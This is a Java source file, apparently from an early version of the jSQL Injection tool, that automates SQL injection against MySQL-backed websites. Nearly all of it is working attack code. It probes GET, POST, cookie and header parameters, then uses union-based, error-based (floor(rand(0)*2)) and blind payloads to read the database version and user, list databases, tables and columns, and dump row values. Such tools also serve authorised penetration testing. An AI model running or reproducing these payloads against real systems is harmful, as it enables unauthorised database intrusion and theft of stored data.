package sqli.model;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import database.model.Column;
import database.model.Database;
import database.model.ElementDatabase;
import database.model.Table;
import sqli.tool.string.StringTool;

public class InjectionModel extends ModelObservable {

	private String 
	insertionCharacter,
			initialUrl,
		  visibleIndex,
		  initialQuery,
	
		  	    method,
	
			   getData,
			  postData,
			cookieData,
			headerData,
	
			 versionDB,
    		 currentDB,
    	   currentUser,
     authenticatedUser,
     
     	   proxyAdress,
     	   	 proxyPort;
	
	private boolean 
			   proxyfied = false,
					
			  normalInjectable = false,
		   errorBaseInjectable = false,
		       blindInjectable = false,

		  useErrorBaseInjection = false,
		      useBlindInjection = false,
		      
		      isInjectionBuilt = false;
	
	private BlindInjection blindModel;
	
	public InjectionModel(){
		this.sendMessage("-- jSQL Injection v0.0 --");
	}
	
	public void inputValidation(){
			insertionCharacter = 
				  visibleIndex =
				  initialQuery =
			
					 versionDB =
		    		 currentDB =
		    	   currentUser =
		     authenticatedUser = null;
						
				  normalInjectable = 
			   errorBaseInjectable = 
			       blindInjectable = 

			  useErrorBaseInjection = 
			      useBlindInjection = 
			      
			      isInjectionBuilt = false;
		
				   blindModel = null;
		
		if(proxyfied && !proxyAdress.equals("") && !proxyPort.equals("")){
			System.setProperty("http.proxyHost", proxyAdress);
			System.setProperty("http.proxyPort", proxyPort);
		}

		try {
			this.sendMessage("Connection test...");
			BufferedReader reader = new BufferedReader(new InputStreamReader( new URL(this.initialUrl).openStream() ));
			reader.readLine();
			reader.close();
			isInjectionBuilt = true;
		} catch (IOException e) {
			this.sendErrorMessage("Connection problem: " + e.getMessage());
			return;
		}
		
		this.sendMessage("Step 1...");
		try{
			this.insertionCharacter = this.getInsertionCharacter();
		}catch(IllegalStateException e){
			this.sendErrorMessage("Parameter problem: " + e.getMessage());
			return;
		}
		
		this.sendMessage("Step 2, blind test...");
		this.blindInjectable = this.isBlindInjectable();
		if(this.blindInjectable)
			new GUIThread("add-blind").start();
		
		this.sendMessage("Step 3, error base test...");
		this.errorBaseInjectable = this.isErrorBaseInjectable();
		if(this.errorBaseInjectable)
			new GUIThread("add-errorbase").start();

		this.sendMessage("Step 4...");
		String[] firstSuccessPageSource = {""};
		this.initialQuery = this.getInitialQuery(firstSuccessPageSource);
		this.normalInjectable = !this.initialQuery.equals("");
		
		if( !this.normalInjectable ){
			if(this.errorBaseInjectable){
				this.sendMessage("Using error base injection");
				this.useErrorBaseInjection = true;
			}else if(this.blindInjectable){
				this.sendMessage("Using blind injection");
				this.useBlindInjection = true;
			}else{
				this.sendErrorMessage("Injection not possible, work stopped");
				return;
			}
		}else{
			this.sendMessage("Step 5...");
			new GUIThread("add-normal").start();
			this.visibleIndex = this.getVisibleIndex(firstSuccessPageSource[0]);
		}
		
		this.sendMessage("Fetching informations...");
		this.getDBInfos();
		
		this.sendMessage("Fetching databases...");
		this.listDatabases();
		this.sendMessage("Done.");
	}

	private String getInsertionCharacter(){		

	    if( this.method.equals("GET") && !this.getData.matches(".*=$") ){ 
	    	Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(this.getData);
			regexSearch.find();
			try{
				this.getData = regexSearch.group(1);
				return regexSearch.group(2);
			}catch(IllegalStateException e){
				throw new IllegalStateException("incorrect GET format");
			}
	    }else if( this.method.equals("POST") && !this.postData.matches(".*=$") ){ 
	    	Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(this.postData);
			regexSearch.find();
			try{
				this.postData = regexSearch.group(1);
				return regexSearch.group(2);
			}catch(IllegalStateException e){
				throw new IllegalStateException("incorrect POST format");
			}
	    }else if( this.method.equals("COOKIE") && !this.cookieData.matches(".*=$") ){ 
	    	Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(this.cookieData);
			regexSearch.find();
			try{
				this.cookieData = regexSearch.group(1);
				return regexSearch.group(2);
			}catch(IllegalStateException e){
				throw new IllegalStateException("incorrect Cookie format");
			}
	    }else if( this.method.equals("HEADER") && !this.headerData.matches(".*:$") ){ 
	    	Matcher regexSearch = Pattern.compile("(.*:)(.*)").matcher(this.headerData);
			regexSearch.find();
			try{
				this.headerData = regexSearch.group(1);
				return regexSearch.group(2);
			}catch(IllegalStateException e){
				throw new IllegalStateException("incorrect Header format");
			}
	    }

		
		for( String insertionCharacter : new String[] {"0","0'","'","-1","1","\"","-1)"} ){
			String pageSource = this.inject(insertionCharacter + "+order+by+1337--+");
			if(Pattern.compile(".*Unknown column '1337' in 'order clause'.*", Pattern.DOTALL).matcher(pageSource).matches() || 
			   Pattern.compile(".*supplied argument is not a valid MySQL result resource.*", Pattern.DOTALL).matcher(pageSource).matches()){
				return insertionCharacter;
			}
		}
		
		return "-1";
	}

	private String getInitialQuery(String[] firstSuccessPageSource) {		
		String selectFields, initialQuery;
		int selectIndex;
		for(selectIndex=1, selectFields="133717330%2b1"; selectIndex<=100 ;selectIndex++, selectFields += ",1337"+selectIndex+"7330%2b1"){
			initialQuery = /*parameterValue +*/ this.insertionCharacter + "+union+select+" + selectFields + "--+";
			firstSuccessPageSource[0] = this.inject(initialQuery);
			
			if(Pattern.compile(".*1337\\d+7331.*", Pattern.DOTALL).matcher(firstSuccessPageSource[0]).matches()){
				initialQuery = initialQuery.replaceAll("0%2b1","1");
				return initialQuery.replaceAll("\\+\\+union\\+select\\+.*?--\\+$","+");
			}
		}
	    
		return "";
	}

	private String getVisibleIndex(String firstSuccessPageSource) {		
		Matcher regexSearch = Pattern.compile("1337(\\d+?)7331", Pattern.DOTALL).matcher(firstSuccessPageSource);
		ArrayList<String> foundIndexes = new ArrayList<String>(); 
		while(regexSearch.find()) 
			foundIndexes.add( regexSearch.group(1) ); 
		
		String[] indexes = foundIndexes.toArray(new String[foundIndexes.size()]);
		
		this.initialQuery = this.initialQuery.replaceAll("1337(?!"+ StringTool.join(indexes,"|") +"7331)\\d*7331","1");
		if(indexes.length == 1) 
			return indexes[0];
		
		String performanceQuery = 
				this.initialQuery.replaceAll(
					"1337("+ StringTool.join(indexes,"|") +")7331",
					"(select+concat(0x53514c69,$1,repeat(0xb8,1024),0x694c5153))"
				);
		
		String performanceSourcePage = this.inject(performanceQuery);
		regexSearch = Pattern.compile("SQLi(\\d+)(#*)", Pattern.DOTALL).matcher(performanceSourcePage);
		ArrayList<String[]> performanceResults = new ArrayList<String[]>();
		while(regexSearch.find()) 
			performanceResults.add( new String[]{regexSearch.group(1),regexSearch.group(2)} ); 
		
		Integer[][] lengthFields = new Integer[performanceResults.size()][2];
		for(int i=0; i < performanceResults.size() ;i++) //# Vérifie quel est l'index qui renvoie le plus de données
			lengthFields[i] = 
					new Integer[]{ 
						performanceResults.get(i)[1].length(), 
						Integer.parseInt(performanceResults.get(i)[0]) 
					};
		
		Arrays.sort(lengthFields, new Comparator<Integer[]>() {
		    @Override
		    public int compare(Integer[] s1, Integer[] s2) {
		        Integer t1 = s1[0];
		        Integer t2 = s2[1];
		        return t1.compareTo(t2);
		    }
		});
	
		this.initialQuery = 
				this.initialQuery.replaceAll(
					"1337(?!"+ lengthFields[lengthFields.length-1][1] +"7331)\\d*7331",
					"1"
				);
		return Integer.toString(lengthFields[lengthFields.length-1][1]);
	}

	private boolean isErrorBaseInjectable() {		
		Matcher regexSearch = Pattern.compile("1337\\d+7331", Pattern.DOTALL).matcher(this.getData);
		if(regexSearch.find())
			return false;

		String performanceSourcePage = this.inject(
			this.insertionCharacter + 
			"+and(" +
				"select+1+" +
				"from(" +
					"select+" +
						"count(*)," +
						"floor(rand(0)*2)" +
					"from+" +
						"information_schema.tables+" +
					"group+by+2" +
				")a" +
			")--+"
		);
		
		return performanceSourcePage.indexOf("Duplicate entry '1' for key ") != -1;
	}

	private boolean isBlindInjectable() {
		Matcher regexSearch = Pattern.compile("1337\\d+7331", Pattern.DOTALL).matcher(this.getData);
		if(regexSearch.find())
			return false;
		
		blindModel = new BlindInjection(this, this.initialUrl+this.getData+this.insertionCharacter);
		return blindModel.isBlindInjectable();
	}

	private void getDBInfos() {		
		String[] sourcePage = {""};
		String hexResult = this.loopIntoResults(
			"concat(" +
				"hex(" +
					"concat_ws(" +
						"0x7b257d," +
						"version()," +
						"database()," +
						"user()," +
						"CURRENT_USER" +
					")" +
				")" +
				"," +
				"0x69" +
			")", 
			sourcePage, 
			false, 
			0, 
			null
		);
		
		if(hexResult.equals("")){
			this.sendResponseFromSite( "Show db info failed", sourcePage[0].trim() );
		}else{
	        this.versionDB = StringTool.hexstr(hexResult).split("\\{%\\}")[0];
	        this.currentDB = StringTool.hexstr(hexResult).split("\\{%\\}")[1];
	        this.currentUser = StringTool.hexstr(hexResult).split("\\{%\\}")[2];
	        this.authenticatedUser = StringTool.hexstr(hexResult).split("\\{%\\}")[3];
	        
		    new GUIThread("add-info").start();	        
		}
	}

	private void listDatabases() {		
		String[] sourcePage = {""};
		String hexResult = this.loopIntoResults(
			"select+" +
				"concat(" +
					"group_concat(" +
						"0x6868," +
						"r," +
						"0x6a6a," +
						"hex(cast(q+as+char))," +
						"0x6868" +
						"+order+by+r+" +
						"separator+0x6767" +
					")," +
					"0x69" +
				")" +
			"from(" +
				"select+" +
					"hex(cast(TABLE_SCHEMA+as+char))r," +
					"count(TABLE_NAME)q+" +
				"from+" +
					"INFORMATION_SCHEMA.tables+" +
				"group+by+r{limit}" +
			")x", 
			sourcePage, 
			true, 
			0, 
			null
		);
		
		Matcher regexSearch = Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);
		
		if(!regexSearch.find()){
			this.sendResponseFromSite( "Fetching databases fails", sourcePage[0].trim() );
		}else{
			regexSearch.reset();
			
			List<Database> databases = new ArrayList<Database>();
			while(regexSearch.find()){ 
			    String databaseName = StringTool.hexstr(regexSearch.group(1));
				String tableCount = StringTool.hexstr(regexSearch.group(2));
				
				Database newDatabase = new Database(databaseName,tableCount+"");
				databases.add(newDatabase);
			}
			
		    new GUIThread("add-databases", databases).start();	 
		}
	}

	public void listTables(Database database) {
	    new GUIThread("start-progress", database).start();

		String tableCount = database.tableCount;
				
		String[] pageSource = {""};
		String hexResult = this.loopIntoResults(
			"select+" +
				"concat(" +
					"group_concat(" +
						"0x6868," +
						"hex(cast(r+as+char))," +
						"0x6a6a," +
						"hex(cast(ifnull(q,0x30)+as+char))," +
						"0x6868+" +
						"order+by+r+" +
						"separator+0x6767" +
					")," +
					"0x69" +
				")" +
			"from(" +
				"select+" +
					"TABLE_NAME+r," +
					"table_rows+q+" +
				"from+" +
					"information_schema.tables+" +
				"where+" +
					"table_schema=0x" + StringTool.strhex(database+"")  + "+" +
					"order+by+r{limit}" +
			")x"
			, 
			pageSource, 
			true, 
			Integer.parseInt(tableCount), 
			database
		);
	    
		Matcher regexSearch = 
				Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);
		
		if(!regexSearch.find()){
			this.sendResponseFromSite( "Fetching tables fails", pageSource[0].trim() );
		}else{
			if((database+"").equals("information_schema")){
				this.sendErrorMessage("Notice for information_schema: unknown number of rows");
			}
			
			regexSearch.reset();
			
			List<Table> tables = new ArrayList<Table>();
			while(regexSearch.find()){ 
				String tableName = StringTool.hexstr(regexSearch.group(1));
				String rowCount  = StringTool.hexstr(regexSearch.group(2));
				
				Table newTable = new Table(tableName, rowCount, database);
				tables.add(newTable);
			}
			
		    new GUIThread("add-tables", tables).start();	        
		}
		
	    new GUIThread("end-progress", database).start();		
	}
	
	public void listColumns(Table table) {
	    new GUIThread("start-indeterminate-progress", table).start();
				
		String[] pageSource = {""};
		String hexResult = this.loopIntoResults(
			"select+" +
				"concat(" +
					"group_concat(" +
						"0x6868," +
						"hex(cast(n+as+char))," +
						"0x6a6a," +
						"0x3331," +
						"0x6868+" +
						"order+by+n+" +
						"separator+0x6767" +
					")," +
					"0x69" +
				")" +
			"from(" +
				"select+" +
					"COLUMN_NAME+n+" +
				"from+" +
					"information_schema.columns+" +
				"where+" +
					"TABLE_SCHEMA=0x"+StringTool.strhex(table.parentDatabase+"")+"+" +
				"and+" +
					"TABLE_NAME=0x"+StringTool.strhex(table+"")+"+" +
				"order+by+n{limit}" +
			")x", 
			pageSource, 
			true, 
			0, 
			table
		);
	
		Matcher regexSearch = Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);
		
		if(!regexSearch.find()){
			this.sendResponseFromSite( "Fetching columns fails", pageSource[0].trim() );
		}else{
			regexSearch.reset();
			
			List<Column> columns = new ArrayList<Column>();
			while(regexSearch.find()){ 
				String columnName = StringTool.hexstr(regexSearch.group(1));
				
				Column newColumn = new Column(columnName, table);
				columns.add(newColumn);
			}
			
			new GUIThread("add-columns", columns).start();
		}
		
	    new GUIThread("end-indeterminate-progress", table).start();
	}

	public void listValues(List<Column> argsElementDatabase) {
		ElementDatabase database = argsElementDatabase.get(0).getParent().getParent();
		ElementDatabase table = argsElementDatabase.get(0).getParent();
		int rowCount = argsElementDatabase.get(0).getParent().getCount();
		
	    new GUIThread("start-progress", table).start();
	    
		List<String> columnsName = new ArrayList<String>();
		for(ElementDatabase e: argsElementDatabase)
			columnsName.add(e+"");
		
		String[] arrayColumns = columnsName.toArray(new String[columnsName.size()]);
		String formatListColumn = StringTool.join(arrayColumns, "{%}");
//		formatListColumn = formatListColumn.replace("{%}", "`),0x7f,trim(`" ); // 7f caractère d'effacement, dernier code hexa supporté par mysql, donne 3f=>? à partir de 80
		formatListColumn = formatListColumn.replace("{%}", "`,0x00)),0x7f,trim(ifnull(`" ); // 7f caractère d'effacement, dernier code hexa supporté par mysql, donne 3f=>? à partir de 80
//		formatListColumn = "trim(`" + formatListColumn + "`)" ;
		formatListColumn = "trim(ifnull(`" + formatListColumn + "`,0x00))" ;
		
		String[] pageSource = {""};
		String hexResult = this.loopIntoResults(
				"select+concat(" +
					"group_concat(" +
						"0x6868," +
						"r," +
						"0x6a6a," +
						"hex(cast(q+as+char))," +
						"0x6868" +
						"+order+by+r+separator+0x6767" +
					")," +
					"0x69" +
				")from(" +
					"select+" +
						"hex(cast(concat("+ formatListColumn +")as+char))r," +
						"count(*)q+" +
					"from+" +
						"`"+ database +"`.`"+ table +"`+" +
					"group+by+r{limit}" +
				")x"  
				, pageSource, true, rowCount, table
		);

		Matcher regexSearch = Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);
		
		if(!regexSearch.find()){
			this.sendResponseFromSite( "Fetching values fails (row count may be approximate)", pageSource[0].trim() );
		}
		
		int rowsFound = 0, duplicates = 0, cutted = 0;
		List<List<String>> listValues = new ArrayList<List<String>>();
			
		regexSearch.reset();
		while(regexSearch.find()){ 
			String values = StringTool.hexstr(regexSearch.group(1));
			int instances = Integer.parseInt( StringTool.hexstr(regexSearch.group(2)) );
			if(regexSearch.group(3) != null)
				cutted++;
			
			listValues.add(new ArrayList<String>());
			listValues.get(rowsFound).add(""+(rowsFound+1));
			listValues.get(rowsFound).add(""+instances);
			for(String cellValue: values.split(StringTool.hexstr("7f"),-1)){
				listValues.get(rowsFound).add(cellValue);
			}
            duplicates += instances - 1;
            rowsFound++;
//            System.out.println( rowsFound + ". "+ instances +"x "+  values.replace("00", "").replace("\r\n", "").replace("\n", "").replace("\r", "") );
		}
		
//    	System.out.println( "# Results: "+ duplicates +" duplicates, "+ rowsFound +" distinct values, " /*+ (rowCount-rowsFound-duplicates) +" unreachables duplicates, "*/ + cutted + " rows truncated\n");

        columnsName.add(0,"nbRow");
        columnsName.add(0,"#");
        
        String[][] tableDatas = new String[listValues.size()][columnsName.size()] ;
        for(int indexRow=0; indexRow<listValues.size() ;indexRow++){
        	boolean isIncomplete = false;
        	for(int indexColumn=0; indexColumn<columnsName.size() ;indexColumn++){
        		try{
        			tableDatas[indexRow][indexColumn] = listValues.get(indexRow).get(indexColumn);
        		}catch(IndexOutOfBoundsException e){
        			isIncomplete = true;
        		}
        	}
        	if(isIncomplete){
        		this.sendErrorMessage("Max string length reached on the distant MySQL server, the row is incomplete:\n" + 
        				StringTool.join(listValues.get(indexRow).toArray(new String[listValues.get(indexRow).size()]), ", ") );
        	}
        }

		arrayColumns = columnsName.toArray(new String[columnsName.size()]);
		Object[] objectData = {arrayColumns, tableDatas, table};
		
	    new GUIThread("add-values", objectData).start();
	    
	    new GUIThread("end-progress", table).start();
	}

	private String loopIntoResults(String initialSQLQuery, String[] sourcePage , boolean useLimit , int numberToFind, ElementDatabase searchName) {
		String sqlQuery = new String(initialSQLQuery).replaceAll("\\{limit\\}","");
		
		String finalResultSource = "", currentResultSource = "";
		for(int limitSQLResult=0, startPosition=1, i=1;/* 3 */;startPosition = currentResultSource.length()+1, i++){
			
//			try {
//				Thread.sleep(1000);
//			} catch (InterruptedException e) {
//				e.printStackTrace();
//			}
				
			if(this.useBlindInjection){
				sourcePage[0] = blindModel.inject("(" +
						"select+" +
						"concat(" +
							"0x53514c69," +
							"mid(" +
								"("+sqlQuery+")," +
								startPosition+"," +
								"65536" +
							")" +
						")"+
					")");
			}else if(this.useErrorBaseInjection){
				sourcePage[0] = this.inject( 
						this.insertionCharacter + "+and" +
							"(" +
								"select+" +
									"1+" +
								"from(" +
									"select+" +
										"count(*)," +
										"concat(" +
											"0x53514c69," +
											"mid(" +
												"("+ sqlQuery +")," +
												startPosition + "," +
												"64" +
											")," +
											"floor(rand(0)*2)" +
										")" +
									"from+information_schema.tables+" +
									"group+by+2" +
								")a" +
							")--+" );				
			}else{
				sourcePage[0] = this.inject( 
					"select+" +
						"concat(" +
							"0x53514c69," +
							"mid(" +
								"("+sqlQuery+")," +
								startPosition+"," +
								"65536" +
							")" +
						")",
					null,
					true
				);
			}
			
			//this.sendMessage("Packet "+i+".\n"+currentResultSource);

			Matcher regexSearch = Pattern.compile("SQLi([0-9A-Fghij]+)", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(sourcePage[0]);
			
			if(!regexSearch.find()){
				if( useLimit && !finalResultSource.equals("") ){
//					this.sendMessage("A");
					if(numberToFind>0 && searchName != null) // nécessaire
						new GUIThread("update-progressbar", new Object[]{searchName,numberToFind}).start();
					break;
				}
			}
			
			try{
				currentResultSource += regexSearch.group(1);
			}catch(IllegalStateException e){
				this.sendErrorMessage("Fetching fails: " + e.getMessage() );
				this.sendErrorMessage("Query: " + sqlQuery );
				break;
			}
			
			regexSearch = Pattern.compile("(h[0-9A-F]*jj[0-9A-F]*c?h)", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource);
			int nbResult=0;
			while(regexSearch.find()){
				nbResult++;
			}
			
			if( useLimit ){
				if(numberToFind>0 && searchName != null)
					new GUIThread("update-progressbar", new Object[]{searchName,limitSQLResult + nbResult}).start();

//				System.out.println("Request " + i + ", data collected "+(limitSQLResult + nbResult) + (numberToFind>0?"/"+numberToFind:"") + " << " + currentResultSource.length() + " bytes" );
			}

			if(currentResultSource.contains("i")){
				finalResultSource += currentResultSource = Pattern.compile("i.*", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource).replaceAll("");
				if( useLimit ){
					finalResultSource = Pattern.compile("(gh+|j+\\d*)$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(finalResultSource).replaceAll("");
					currentResultSource = Pattern.compile("(gh+|j+\\d*)$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource).replaceAll("");
					
					regexSearch = Pattern.compile("[0-9A-F]hhgghh[0-9A-F]+$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource);
					Matcher regexSearch2=Pattern.compile("h[0-9A-F]+$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource);
					
					if(regexSearch.find()){
						finalResultSource = Pattern.compile("hh[0-9A-F]+$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(finalResultSource).replaceAll("");
					}else if(regexSearch2.find()){
						finalResultSource += "jj31chh";
					}
					
					regexSearch = Pattern.compile("(h[0-9A-F]*jj[0-9A-F]*c?h)", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(finalResultSource);
					
					nbResult=0;
					while(regexSearch.find()){
						nbResult++;
					}
					limitSQLResult = nbResult;
					
//					System.out.println("Request " + i + ", data collected " + limitSQLResult + (numberToFind>0 ? "/"+numberToFind : "" ));
					if(numberToFind>0 && searchName != null)
						new GUIThread("update-progressbar", new Object[]{searchName,limitSQLResult}).start();

					if( limitSQLResult == numberToFind ){ 
//						this.sendMessage("B");
						if(numberToFind>0 && searchName != null)
							new GUIThread("update-progressbar", new Object[]{searchName,numberToFind}).start();
						break; 
					}
					
                    sqlQuery = Pattern.compile("\\{limit\\}", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(initialSQLQuery).replaceAll("+limit+" + limitSQLResult + ",65536");
                    startPosition=1;
                    currentResultSource="";
				}else {
//					this.sendMessage("C");
					if(numberToFind>0 && searchName != null)
						new GUIThread("update-progressbar", new Object[]{searchName,numberToFind}).start();
					break;
				}
			}else if(currentResultSource.length() % 2 == 0){
				currentResultSource = currentResultSource.substring(0, currentResultSource.length()-1);
			}
		}

		return finalResultSource;
	}

	private String inject( String dataInjection ){
		return this.inject(dataInjection, null, false);
	}

	private String inject( String dataInjection, String[] responseHeader, boolean useVisibleIndex ){
	    HttpURLConnection connection = null;
		URL urlObject = null;

		String urlUltimate = this.initialUrl;
		dataInjection = dataInjection.replace("\\", "\\\\"); // escape crazy characters, like \ 
		
		try {
			urlObject = new URL(urlUltimate);
		} catch (MalformedURLException e) {
			this.sendErrorMessage(e.getMessage());
		}
		
		if(this.getData != null && !this.getData.equals("")){
			urlUltimate += this.buildQuery("GET", getData, useVisibleIndex, dataInjection);
//			System.out.println(urlUltimate);
			try {
				urlObject = new URL(urlUltimate);
			} catch (MalformedURLException e) {
				this.sendErrorMessage(e.getMessage());
			}
		}
		
		try {
			connection = (HttpURLConnection) urlObject.openConnection();
		} catch (IOException e) {
			this.sendErrorMessage(e.getMessage());
		}
		
		if(!this.cookieData.equals("")){
			connection.addRequestProperty("Cookie", this.buildQuery("COOKIE", cookieData, useVisibleIndex, dataInjection));
		}
		
		if(!this.headerData.equals("")){
			for(String s: this.buildQuery("HEADER", headerData, useVisibleIndex, dataInjection).split(";")){
				try {
					connection.addRequestProperty(s.split(":",2)[0], URLDecoder.decode(s.split(":",2)[1],"UTF-8"));
				} catch (UnsupportedEncodingException e) {
					this.sendErrorMessage(e.getMessage());
				}
			}
		}
		
		if(!this.postData.equals("")){
			try {
		        connection.setDoOutput(true);
		        connection.setRequestMethod("POST");
		        connection.addRequestProperty("Content-Type", "application/x-www-form-urlencoded");
	
		        DataOutputStream dataOut = new DataOutputStream(connection.getOutputStream());
		        dataOut.writeBytes(this.buildQuery("POST", postData, useVisibleIndex, dataInjection));
		        dataOut.flush();
		        dataOut.close();
			} catch (IOException e) {
				this.sendErrorMessage(e.getMessage());
			}
		}
		
		String line, pageSource = "";
		try {
			BufferedReader reader = new BufferedReader(new InputStreamReader( connection.getInputStream() ));
			while( (line = reader.readLine()) != null ) pageSource += line;
			reader.close();
		} catch (MalformedURLException e) {
			this.sendErrorMessage(e.getMessage());
		} catch (IOException e) {
			this.sendErrorMessage(e.getMessage());
		}
		
		return pageSource;
	}
	
	private String buildQuery( String dataType, String newData, boolean useVisibleIndex, String urlPremiere ){
		if(!this.method.equals(dataType)){
			return newData;
		}else if(!useVisibleIndex){
			return newData + urlPremiere;
		}else{
			return newData + this.initialQuery.replaceAll("1337"+visibleIndex+"7331","("+urlPremiere+")");
		}
	}
	
	public String getVersionDB(){
		return this.versionDB;
	}
	public String getCurrentDB(){
		return this.currentDB;
	}
	public String getCurrentUser(){
		return this.currentUser;
	}
	public String getAuthenticatedUser(){
		return this.authenticatedUser;
	}
	
	public void setInitialUrl(String newInitialUrl){
		this.initialUrl = newInitialUrl;		
	}
	public void setGetData(String newData){
		this.getData = newData;		
	}
	public void setPostData(String newData){
		this.postData = newData;
	}
	public void setCookieData(String newData){
		this.cookieData = newData;		
	}
	public void setHeaderData(String newData){
		this.headerData = newData;		
	}
	public void setMethod(String newMethod){
		this.method = newMethod;		
	}
	
	public void setProxyAdress(String newProxyAdress){
		this.proxyAdress = newProxyAdress;		
	}
	public void setProxyPort(String newProxyPort){
		this.proxyPort = newProxyPort;		
	}
	public void setProxyfied(boolean newIsProxy){
		this.proxyfied = newIsProxy;		
	}
	
	public void sendMessage(String message) {
	    new GUIThread("console-message",message+"\n").start();
	}
	public void sendResponseFromSite(String message, String source) {
		this.sendMessage( message + ", response from site:\n>>>"+ source );
	}
	public void sendErrorMessage(String message) {
		this.sendMessage("*** "+message);
	}

	public boolean isProxyfied() {
		return proxyfied;
	}
	public String getProxyAdress() {
		return proxyAdress;
	}
	public String getProxyPort() {
		return proxyPort;
	}

	public boolean isInjectionBuilt() {
		return isInjectionBuilt;
	}
}
